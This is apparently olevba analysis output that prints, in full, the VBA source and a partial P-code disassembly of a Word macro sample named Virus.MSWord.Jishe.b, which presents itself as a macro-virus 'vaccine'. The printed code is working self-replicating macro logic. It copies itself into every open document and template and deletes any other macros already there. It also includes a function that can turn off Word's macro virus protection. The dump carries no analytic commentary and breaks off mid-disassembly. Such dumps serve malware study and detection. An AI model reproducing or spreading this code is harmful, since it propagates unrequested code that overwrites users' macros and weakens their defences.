olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jishe.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO JiShenhua 
in file: Virus.MSWord.Jishe.b - OLE stream: 'JiShenhua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'ÕâÊÇ±¾ÈËÑ§Ï°ÖÆ×÷µÄÒ»¸öºê²¡¶¾·ÀÉ±³ÌÐò,Ëü¿ÉÒÔ·ÀÖ¹²¿·ÖWORDºê²¡¶¾µÄ¸ÐÈ¾
'ÕâÐèÒªÓÐ´óÁ¿µÄºê²¡¶¾ÌØÕ÷Âë×÷ÎªÒÀ¾Ý,Èç¹ûÄã·¢ÏÖÓÐ±¾ÒßÃçÎÞÄÜÎªÁ¦µÄºê²¡¶¾
'¸ÐÐ»Äú¼°Ê±ÓëÎÒÁªÏµ,ÄãÒ²¿ÉÒÔ×ÔÑ¡ÐÞ¸Ä±¾³ÌÐò,ÒÔ¼ÓÇ¿±¾ÒßÃçµÄ¹¦Á¦
'Óë²¡¶¾×÷¶·Õù¾ÍÈçÍ¬µÖÓùÉç»á·¸×ï,ÐèÒª´ó¼ÒµÄ¹²Í¬Å¬Á¦
'»¶Ó­¼ÓÈëÆäÖÐ²¢³ÉÎªÒ»ÃûÕ½Ê¿,Ò²ÐíÄãÕýÊÇ´ó¼ÒÆÚ´ýÒÑ¾ÃµÄÓÂÊ¿
'³ÌÐòÉè¼Æ: ¼½É÷»ª
'°ì¹«µç»°:
'ÒÁÃÃµØÖ·: club@263.net
Option Explicit '³ÌÐòÖÐµÄ±äÁ¿±ØÐëÏÈ¶¨ÒåºóÊ¹ÓÃ
Public pVirusReport As String '²¡¶¾ÃèÊöÐÅÏ¢
Private Const cMyID As String = "MyMacroVirusKillerV2.0" '±¾³ÌÐò´úÂë±êÖ¾
Private Const cMyModule As String = "JiShenhua" '±¾³ÌÐòµÄÄ£¿éÃû³Æ
Private Const cMyUserForm As String = "VirusReport" '±¾³ÌÐòµÄÓÃ»§´°¿ÚÃû³Æ
Private Const cOK As Integer = 0 'Ò»ÇÐÕý³£
Private Const cDocHasModuleElse As Integer = 1 'ÓÐÆäËûÄ£¿é´æÔÚ
Private Const cDocHasCodeElse As Integer = 2 'ÔÚThisDocumentÄ£¿éÖÐÓÐÆäËû´úÂë´æÔÚ
Private Const cDocHasAllElse As Integer = 3 'ÔÚThisDocumentÄ£¿éÖÐÓÐÆäËû´úÂë´æÔÚ£¬²¢ÓÐÆäËûÄ£¿é´æÔÚ
Private Const cDocProtected As Integer = 4 '¸ÃÎÄµµ±»±£»¤
'´ÓÖ¸¶¨ÎÄ¼þÖÐÏòËùÓÐ´ò¿ªÎÄµµ¼°Ä£°åÖÐ¸´ÖÆ±¾³ÌÐò´úÂë¼°Ä£¿é
Public Function InfectAll() As Boolean
    Dim myDoc As Document, myTemp As Template
    'Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾´úÂë
    For Each myDoc In Documents
        Infect myDoc
    Next myDoc
    'ÏòWORDÄ£°åÖÐÐ´Èë±¾´úÂë
    For Each myTemp In Templates
        Infect myTemp
    Next myTemp
    InfectAll = True
End Function
'Çå³ýËùÓÐ´ò¿ªÎÄµµ¼°Ä£°åÖÐµÄ²¡¶¾Ä£¿é¼°´úÂë
Public Function ClearVirus() As Boolean
    Dim i As Integer
    Dim myDoc As Document, myTemp As Template
    Dim Cleared As Boolean

    ClearVirus = True
    '¼ì²éËùÓÐÎÄµµ²¢Çå³ý
    For Each myDoc In Documents
        Cleared = ClearDocument(myDoc)
        If Not Cleared Then
            MsgBox "²¡¶¾Çå³ý¹¤×÷²»³É¹¦£¬Çë¼ì²éÔ­Òò¡£", vbOKOnly, myDoc.Name
            ClearVirus = False
        End If
    Next myDoc
    '¼ì²éËùÓÐÄ£°å²¢Çå³ý
    For Each myTemp In Templates
        Cleared = ClearDocument(myTemp)
        If Not Cleared Then
            MsgBox "²¡¶¾Çå³ý¹¤×÷²»³É¹¦£¬Çë¼ì²éÔ­Òò¡£", vbOKOnly, myTemp.Name
            ClearVirus = False
        End If
    Next myTemp
End Function
'¼ì²éËùÓÐ´ò¿ªµÄÎÄµµ¼°Ä£°åÖÐÊÇ·ñÓÐ²¡¶¾´æÔÚ£¬Èç¹ûÓÐ£¬·µ»Ø²¡¶¾ÐÅÏ¢ÃèÊö×Ö·û´®
Public Function ScanVirus() As Boolean
    Dim DocsCount As Integer, i As Integer, ret As Integer
    Dim myStr As String
    Dim myDoc As Document, myTemp As Template
    
    ScanVirus = False
    pVirusReport = ""
    '¼ì²éËùÓÐ´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾
    For Each myDoc In Documents
        ret = ScanDocument(myDoc)
        Select Case ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "º¯ÊýScanDocument·µ»Ø´íÎó´úÂë£¬ÏµÍ³ÎÞ·¨Ê¶±ð¡£", vbOKOnly, "ÏµÍ³³ö´í"
        End Select
    Next myDoc
    '¼ì²éËùÓÐÄ£°å
    For Each myTemp In Templates
        ret = ScanDocument(myTemp)
        Select Case ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "º¯ÊýScanDocument·µ»Ø´íÎó´úÂë£¬ÏµÍ³ÎÞ·¨Ê¶±ð¡£", vbOKOnly, "ÏµÍ³³ö´í"
        End Select
    Next myTemp
End Function
'¹Ø±ÕWordºê²¡¶¾±£»¤¹¦ÄÜ
Public Function CloseVirusProtection(Optional Protected As Boolean = False)
    Options.VirusProtection = Protected
End Function
'°Ñ±¾³ÌÐò´úÂë´ÓÒ»¸öÎÄ¼þ¸´ÖÆµ½ÁíÒ»¸öÎÄ¼þÖÐ
Private Function Infect(TargetFile) As Boolean
    Dim xItem, CommandStr As String, file As String
    Dim myDoc As Document, myTemp As Template
    Dim LinesofCode As Long, myStr As String
    
    '¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·
    myStr = TypeName(TargetFile)
    If myStr <> "Document" And myStr <> "Template" Then
        MsgBox "Ê¹ÓÃÊý¾ÝÀàÐÍ" + myStr + "µ÷ÓÃº¯ÊýInfect£¬ÏµÍ³Ö»ÔÊÐíÊ¹ÓÃDocument¼°TemplateÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Infect = False
        Exit Function
    End If
    Infect = True
    If TargetFile.Name = ThisDocument.Name Then Exit Function 'Ä¿±êÎÄ¼þÓëÔ´ÎÄ¼þÏàÍ¬Ê±²»Ö´ÐÐÐ´Èë²Ù×÷
    If Infected(TargetFile) Then Exit Function 'Ä¿±êÎÄ¼þÒÑ¾­´æÔÚ±¾³ÌÐò´úÂë
    If TargetFile.VBProject.Protection Then Exit Function 'Ä¿±êÎÄ¼þ±»±£»¤£¬²»ÄÜÖ´ÐÐÐ´Èë²Ù×÷
    Infect = False
    
    'Çå³ýÄ¿±êÎÄµµÖÐÒÑ¾­´æÔÚµÄÆäËûÄ£¿é¼°´úÂë
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.CodeModule.CountOfLines
            If LinesofCode > 0 Then xItem.CodeModule.DeleteLines 1, LinesofCode
        Else
            TargetFile.VBProject.VBComponents.Remove xItem
        End If
    Next xItem
    
    'ÏòÎÄµµÖÐÐ´Èë±¾³ÌÐò´úÂë¼°Ä£¿é
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyModule, TargetFile.FullName + ":" + cMyModule
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyUserForm, TargetFile.FullName + ":" + cMyUserForm

    ' ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^
    
    '¸Ã³ÌÐò¶ÎÈç¹û·ÅÔÚÇ°Á½¸öÓï¾äÖ®Ç°£¬¾Í»áµ¼ÖÂVBA32.DLL³ÌÐò³öÏÖÖÂÃü´íÎó¶øËÀ»ú£¬
    'ÇîÎÒÖ®±ÏÉú±à³Ì¾­Ñé£¬²»ÖªºÎ¹Ê£¬ÌìÄÄ£¡ÌìÀíºÎÔÚ£¿
    
    LinesofCode = ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
    myStr = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(1, LinesofCode)
    TargetFile.VBProject.VBComponents(1).CodeModule.InsertLines 1, myStr
    
    Infect = True
End Function
'¼ì²éÖ¸¶¨ÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾³ÌÐò´úÂë
Private Function Infected(TargetFile)
    Dim xItem, LinesofCode As Integer
    Dim HasVirus As Integer
    Dim myType As String
    
    myType = TypeName(TargetFile)
    If myType <> "Document" And myType <> "Template" Then
        MsgBox "Ê¹ÓÃÊý¾ÝÀàÐÍ" + myType + "µ÷ÓÃº¯ÊýInfected£¬ÏµÍ³Ö»ÔÊÐíÊ¹ÓÃDocument¼°TemplateÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Infected = True
        Exit Function
    End If
    
    '¼ì²éÄ¿±êÎÄµµÊÇ·ñ±»±£»¤
    If TargetFile.VBProject.Protection Then
        Infected = True
        Exit Function
    End If
    
    'µ±ThisDocument,myModule,myUserForm¾ù´æÔÚÊ±£¬±íÊ¾¸ÃÎÄ¼þÒÑ¾­±»¸ÐÈ¾
    HasVirus = 0
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.CodeModule.CountOfLines
            If (LinesofCode > 0) And (xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                HasVirus = HasVirus Or 1
            End If
        ElseIf xItem.Name = cMyModule Then
            HasVirus = HasVirus Or 2
        ElseIf xItem.Name = cMyUserForm Then
            HasVirus = HasVirus Or 4
        End If
    Next xItem
    If HasVirus = 7 Then
        Infected = True
    Else
        Infected = False
    End If
End Function
'¼ì²éÖ¸¶¨µÄ´ò¿ªÎÄµµ¼°Ä£°åÖÐÊÇ·ñÓÐ²¡¶¾´æÔÚ
Private Function ScanDocument(myDocOrTemp) As Integer
    Dim xItem, i As Integer, myStr As String
    Dim LinesofCode As Integer
    
    ScanDocument = cOK
    '¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "µ÷ÓÃº¯ÊýScanDocumentÖ»ÄÜÊ¹ÓÃDocument¼°TemplateÊý¾ÝÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Exit Function
    End If
    myStr = myDocOrTemp.Name + "¼ì²é½á¹û£º" + Chr(10)
    '¼ì²é³ÌÐòÄ£¿éÊÇ·ñ±»±£»¤
    If myDocOrTemp.VBProject.Protection Then
        ScanDocument = cDocProtected
        myStr = myStr + "  ÎÄ¼þÖÐµÄ³ÌÐò´úÂë±»±£»¤£¬ÏµÍ³ÎÞ·¨×Ô¶¯²éÉ±£¬µ«Ò²¿ÉÄÜ´æÔÚ²¡¶¾£¬ÇëÐ¡ÐÄ£¡" + Chr(10)
        Exit Function
    End If
    For Each xItem In myDocOrTemp.VBProject.VBComponents
        If (xItem.Name = "ThisDocument") Then
            '´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾
            LinesofCode = xItem.CodeModule.CountOfLines
            If (LinesofCode > 0) And (Not xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                ScanDocument = ScanDocument Or cDocHasCodeElse
                myStr = myStr + "  <" + xItem.Name + ">¶ÔÏóÖÐÓÐÆäËû³ÌÐò´æÔÚ£¬´ó¸ÅÊÇ²¡¶¾¡£" + Chr(10)
            End If
        ElseIf (xItem.Name <> cMyModule) And (xItem.Name <> cMyUserForm) Then
            'ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾
            ScanDocument = ScanDocument Or cDocHasModuleElse
            myStr = myStr + "  ÓÐÆäËûÄ£¿é<" + xItem.Name + ">´æÔÚ£¬¼«ÓÐ¿ÉÄÜÊÇ²¡¶¾¡£" + Chr(10)
        End If
    Next
    If ScanDocument = cOK Then myStr = myStr + "  Ã»ÓÐ²¡¶¾£¬Çë·ÅÐÄÊ¹ÓÃ¡£" + Chr(10)
    pVirusReport = pVirusReport + myStr
End Function
'Çå³ýÖ¸¶¨µÄ´ò¿ªÎÄµµ¼°Ä£°åÖÐµÄ²¡¶¾Ä£¿é¼°´úÂë
Private Function ClearDocument(myDocOrTemp) As Boolean
    Dim xItem, LinesofCode As Integer
    
    ClearDocument = False
    '¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "µ÷ÓÃº¯ÊýClearDocumentÖ»ÄÜÊ¹ÓÃDocument¼°TemplateÊý¾ÝÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Exit Function
    End If
    If myDocOrTemp.VBProject.Protection Then
        ClearDocument = True
        Exit Function
    End If
    '¼ì²éÎÄµµÊÇ·ñÓÐ²¡¶¾
    If ScanDocument(myDocOrTemp) Then
        For Each xItem In myDocOrTemp.VBProject.VBComponents
            If xItem.Name = "ThisDocument" Then
                LinesofCode = xItem.CodeModule.CountOfLines
                If (LinesofCode > 0) And (Not xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                    xItem.CodeModule.DeleteLines 1, LinesofCode
                End If
            ElseIf xItem.Name <> cMyModule And xItem.Name <> cMyUserForm Then
                myDocOrTemp.VBProject.VBComponents.Remove xItem
            End If
        Next
    End If
    ClearDocument = True
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Jishe.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3841 bytes
' Macros/VBA/JiShenhua - 22929 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0043 "这是本人学习制作的一个宏病毒防杀程序,它可以防止部分WORD宏病毒的感染"
' Line #1:
' 	QuoteRem 0x0000 0x0045 "这需要有大量的宏病毒特征码作为依据,如果你发现有本疫苗无能为力的宏病毒"
' Line #2:
' 	QuoteRem 0x0000 0x003C "感谢您及时与我联系,你也可以自选修改本程序,以加强本疫苗的功力"
' Line #3:
' 	QuoteRem 0x0000 0x0031 "与病毒作斗争就如同抵御社会犯罪,需要大家的共同努力"
' Line #4:
' 	QuoteRem 0x0000 0x0037 "欢迎加入其中并成为一名战士,也许你正是大家期待已久的勇士"
' Line #5:
' 	QuoteRem 0x0000 0x0010 "程序设计: 冀慎华"
' Line #6:
' 	QuoteRem 0x0000 0x0009 "办公电话:"
' Line #7:
' 	QuoteRem 0x0000 0x0016 "伊妹地址: club@263.net"
' Line #8:
' 	Option  (Explicit)
' 	QuoteRem 0x0010 0x001C "程序中的变量必须先定义后使用"
' Line #9:
' 	Dim (Public) 
' 	VarDefn pVirusReport (As String)
' 	QuoteRem 0x001E 0x000C "病毒描述信息"
' Line #10:
' 	Dim (Private Const) 
' 	LitStr 0x0016 "MyMacroVirusKillerV2.0"
' 	VarDefn cMyID (As String)
' 	QuoteRem 0x0039 0x000E "本程序代码标志"
' Line #11:
' 	Dim (Private Const) 
' 	LitStr 0x0009 "JiShenhua"
' 	VarDefn cMyModule (As String)
' 	QuoteRem 0x0030 0x0010 "本程序的模块名称"
' Line #12:
' 	Dim (Private Const) 
' 	LitStr 0x000B "VirusReport"
' 	VarDefn cMyUserForm (As String)
' 	QuoteRem 0x0034 0x0014 "本程序的用户窗口名称"
' Line #13:
' 	Dim (Private Const) 
' 	LitDI2 0x0000 
' 	VarDefn cOK (As Integer)
' 	QuoteRem 0x0021 0x0008 "一切正常"
' Line #14:
' 	Dim (Private Const) 
' 	LitDI2 0x0001 
' 	VarDefn cDocHasModuleElse (As Integer)
' 	QuoteRem 0x002F 0x000E "有其他模块存在"
' Line #15:
' 	Dim (Private Const) 
' 	LitDI2 0x0002 
' 	VarDefn cDocHasCodeElse (As Integer)
' 	QuoteRem 0x002D 0x0022 "在ThisDocument模块中有其他代码存在"
' Line #16:
' 	Dim (Private Const) 
' 	LitDI2 0x0003 
' 	VarDefn cDocHasAllElse (As Integer)
' 	QuoteRem 0x002C 0x0034 "在ThisDocument模块中有其他代码存在，并有其他模块存在"
' Line #17:
' 	Dim (Private Const) 
' 	LitDI2 0x0004 
' 	VarDefn cDocProtected (As Integer)
' 	QuoteRem 0x002B 0x000C "该文档被保护"
' Line #18:
' 	QuoteRem 0x0000 0x0036 "从指定文件中向所有打开文档及模板中复制本程序代码及模块"
' Line #19:
' 	FuncDefn (Public Function InfectAll() As Boolean)
' Line #20:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #21:
' 	QuoteRem 0x0004 0x0018 "向打开的文档中写入本代码"
' Line #22:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #23:
' 	Ld myDoc 
' 	ArgsCall Infect 0x0001 
' Line #24:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	QuoteRem 0x0004 0x0016 "向WORD模板中写入本代码"
' Line #26:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #27:
' 	Ld myTemp 
' 	ArgsCall Infect 0x0001 
' Line #28:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	LitVarSpecial (True)
' 	St InfectAll 
' Line #30:
' 	EndFunc 
' Line #31:
' 	QuoteRem 0x0000 0x0028 "清除所有打开文档及模板中的病毒模块及代码"
' Line #32:
' 	FuncDefn (Public Function ClearVirus() As Boolean)
' Line #33:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #34:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #35:
' 	Dim 
' 	VarDefn Cleared (As Boolean)
' Line #36:
' Line #37:
' 	LitVarSpecial (True)
' 	St ClearVirus 
' Line #38:
' 	QuoteRem 0x0004 0x0012 "检查所有文档并清除"
' Line #39:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #40:
' 	Ld myDoc 
' 	ArgsLd ClearDocument 0x0001 
' 	St Cleared 
' Line #41:
' 	Ld Cleared 
' 	Not 
' 	IfBlock 
' Line #42:
' 	LitStr 0x0020 "病毒清除工作不成功，请检查原因。"
' 	Ld vbOKOnly 
' 	Ld myDoc 
' 	MemLd New 
' 	ArgsCall MsgBox 0x0003 
' Line #43:
' 	LitVarSpecial (False)
' 	St ClearVirus 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	QuoteRem 0x0004 0x0012 "检查所有模板并清除"
' Line #47:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #48:
' 	Ld myTemp 
' 	ArgsLd ClearDocument 0x0001 
' 	St Cleared 
' Line #49:
' 	Ld Cleared 
' 	Not 
' 	IfBlock 
' Line #50:
' 	LitStr 0x0020 "病毒清除工作不成功，请检查原因。"
' 	Ld vbOKOnly 
' 	Ld myTemp 
' 	MemLd New 
' 	ArgsCall MsgBox 0x0003 
' Line #51:
' 	LitVarSpecial (False)
' 	St ClearVirus 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	EndFunc 
' Line #55:
' 	QuoteRem 0x0000 0x0048 "检查所有打开的文档及模板中是否有病毒存在，如果有，返回病毒信息描述字符串"
' Line #56:
' 	FuncDefn (Public Function ScanVirus() As Boolean)
' Line #57:
' 	Dim 
' 	VarDefn DocsCount (As Integer)
' 	VarDefn i (As Integer)
' 	VarDefn ret (As Integer)
' Line #58:
' 	Dim 
' 	VarDefn myStr (As String)
' Line #59:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #60:
' Line #61:
' 	LitVarSpecial (False)
' 	St ScanVirus 
' Line #62:
' 	LitStr 0x0000 ""
' 	St pVirusReport 
' Line #63:
' 	QuoteRem 0x0004 0x001E "检查所有打开的文档中是否有病毒"
' Line #64:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #65:
' 	Ld myDoc 
' 	ArgsLd ScanDocument 0x0001 
' 	St ret 
' Line #66:
' 	Ld ret 
' 	SelectCase 
' Line #67:
' 	Ld cOK 
' 	Case 
' 	Ld cDocProtected 
' 	Case 
' 	CaseDone 
' Line #68:
' 	Ld cDocHasModuleElse 
' 	Case 
' 	Ld cDocHasCodeElse 
' 	Case 
' 	Ld cDocHasAllElse 
' 	Case 
' 	CaseDone 
' Line #69:
' 	LitVarSpecial (True)
' 	St ScanVirus 
' Line #70:
' 	CaseElse 
' Line #71:
' 	LitStr 0x002C "函数ScanDocument返回错误代码，系统无法识别。"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统出错"
' 	ArgsCall MsgBox 0x0003 
' Line #72:
' 	EndSelect 
' Line #73:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	QuoteRem 0x0004 0x000C "检查所有模板"
' Line #75:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #76:
' 	Ld myTemp 
' 	ArgsLd ScanDocument 0x0001 
' 	St ret 
' Line #77:
' 	Ld ret 
' 	SelectCase 
' Line #78:
' 	Ld cOK 
' 	Case 
' 	Ld cDocProtected 
' 	Case 
' 	CaseDone 
' Line #79:
' 	Ld cDocHasModuleElse 
' 	Case 
' 	Ld cDocHasCodeElse 
' 	Case 
' 	Ld cDocHasAllElse 
' 	Case 
' 	CaseDone 
' Line #80:
' 	LitVarSpecial (True)
' 	St ScanVirus 
' Line #81:
' 	CaseElse 
' Line #82:
' 	LitStr 0x002C "函数ScanDocument返回错误代码，系统无法识别。"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统出错"
' 	ArgsCall MsgBox 0x0003 
' Line #83:
' 	EndSelect 
' Line #84:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	NextVar 
' Line #85:
' 	EndFunc 
' Line #86:
' 	QuoteRem 0x0000 0x0016 "关闭Word宏病毒保护功能"
' Line #87:
' 	ConstFuncExpr 
' 	LitVarSpecial (False)
' 	FuncDefn (Public Function CloseVirusProtection(Optional Protected As Boolean))
' Line #88:
' 	Ld Protected 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #89:
' 	EndFunc 
' Line #90:
' 	QuoteRem 0x0000 0x0028 "把本程序代码从一个文件复制到另一个文件中"
' Line #91:
' 	FuncDefn (Private Function Infect(TargetFile) As Boolean)
' Line #92:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn CommandStr (As String)
' 	VarDefn file (As String)
' Line #93:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #94:
' 	Dim 
' 	VarDefn LinesofCode (As Long)
' 	VarDefn myStr (As String)
' Line #95:
' Line #96:
' 	QuoteRem 0x0004 0x0014 "检查参数类型是否正确"
' Line #97:
' 	Ld TargetFile 
' 	ArgsLd TypeName 0x0001 
' 	St myStr 
' Line #98:
' 	Ld myStr 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myStr 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #99:
' 	LitStr 0x000C "使用数据类型"
' 	Ld myStr 
' 	Add 
' 	LitStr 0x0036 "调用函数Infect，系统只允许使用Document及Template类型。"
' 	Add 
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统错误"
' 	ArgsCall MsgBox 0x0003 
' Line #100:
' 	LitVarSpecial (False)
' 	St Infect 
' Line #101:
' 	ExitFunc 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	LitVarSpecial (True)
' 	St Infect 
' Line #104:
' 	Ld TargetFile 
' 	MemLd New 
' 	Ld ThisDocument 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' 	QuoteRem 0x003E 0x0024 "目标文件与源文件相同时不执行写入操作"
' Line #105:
' 	Ld TargetFile 
' 	ArgsLd Infected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' 	QuoteRem 0x002F 0x001A "目标文件已经存在本程序代码"
' Line #106:
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' 	QuoteRem 0x003A 0x0020 "目标文件被保护，不能执行写入操作"
' Line #107:
' 	LitVarSpecial (False)
' 	St Infect 
' Line #108:
' Line #109:
' 	QuoteRem 0x0004 0x0026 "清除目标文档中已经存在的其他模块及代码"
' Line #110:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #111:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #112:
' 	Ld xItem 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #113:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #114:
' 	ElseBlock 
' Line #115:
' 	Ld xItem 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #118:
' Line #119:
' 	QuoteRem 0x0004 0x001C "向文档中写入本程序代码及模块"
' Line #120:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyModule 
' 	Add 
' 	Ld TargetFile 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyModule 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0002 
' Line #121:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyUserForm 
' 	Add 
' 	Ld TargetFile 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyUserForm 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0002 
' Line #122:
' Line #123:
' 	QuoteRem 0x0004 0x0047 " ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^"
' Line #124:
' Line #125:
' 	QuoteRem 0x0004 0x0049 "该程序段如果放在前两个语句之前，就会导致VBA32.DLL程序出现致命错误而死机，"
' Line #126:
' 	QuoteRem 0x0004 0x002E "穷我之毕生编程经验，不知何故，天哪！天理何在？"
' Line #127:
' Line #128:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #129:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St myStr 
' Line #130:
' 	LitDI2 0x0001 
' 	Ld myStr 
' 	LitDI2 0x0001 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #131:
' Line #132:
' 	LitVarSpecial (True)
' 	St Infect 
' Line #133:
' 	EndFunc 
' Line #134:
' 	QuoteRem 0x0000 0x0022 "检查指定文档中是否已经有本程序代码"
' Line #135:
' 	FuncDefn (Private Function Infected(TargetFile))
' Line #136:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn LinesofCode (As Integer)
' Line #137:
' 	Dim 
' 	VarDefn HasVirus (As Integer)
' Line #138:
' 	Dim 
' 	VarDefn myType (As String)
' Line #139:
' Line #140:
' 	Ld TargetFile 
' 	ArgsLd TypeName 0x0001 
' 	St myType 
' Line #141:
' 	Ld myType 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myType 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
